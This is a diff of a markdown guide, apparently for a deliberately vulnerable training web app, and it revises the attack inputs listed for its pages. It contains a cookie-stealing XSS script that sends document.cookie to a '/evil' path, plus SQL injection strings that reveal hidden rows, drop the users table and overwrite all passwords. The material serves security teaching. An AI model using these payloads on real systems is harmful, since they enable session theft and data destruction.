@@ -18,7 +18,7 @@ escaped.
    * __Steal cookies__: `<script> $.get("/evil?save=cookie&cookie="+encodeURI(document.cookie)); </script>`
 2. SQL Injection: SQL query is manually created and not properly escaped.
    * Test shows stack trace and actual code: `'`
-   * See all hidden links: `aaa ' OR hide=1 OR hide='`
+   * See all hidden links: ` ' OR hide=1 /*`
 
 ## Login
 
@@ -31,8 +31,8 @@ escaped.
    * You can click a link (or not) and be logged in as someone else
 4. __SQL injection: SQL query not properly escaped__
    * Test shows stack trace and actual code: `'`
-   * Delete tables: `'); DROP TABLE users;('`
-   * Change all passwords: `'); UPDATE users SET password='funfun';`
+   * Delete tables: `', ''); DROP TABLE users;/*
+   * Change all passwords: `', ''); UPDATE users SET password='funfun';/*
 
 ## Pay
 
